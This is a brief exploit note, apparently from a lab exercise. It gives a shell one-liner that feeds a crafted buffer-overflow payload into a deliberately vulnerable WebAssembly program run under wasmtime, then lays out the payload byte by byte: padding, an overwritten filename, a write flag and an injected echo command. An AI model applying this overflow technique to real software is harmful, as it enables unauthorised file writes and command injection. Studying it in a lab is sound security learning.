echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBdanger\x00\x00\x00w\x00echo 'This is dangerous :-('" | wasmtime --dir=. vuln.wasm

fill buffer (32 bytes): 32 x A
fill other data until constant filename (22 bytes): BBBBBBBBBBBBBBBBBBBBBB
filename (6 bytes + 1 NULL byte): danger\x00
fill up space until 2nd argument of file(), write flag: "\x00\x00"
file 2nd argument (write flag + NULL byte): w\x00
27 bytes payload available (that is the length of the original string): "echo 'this is dangerous :('"
I don't know why, bad " " is a bad byte!?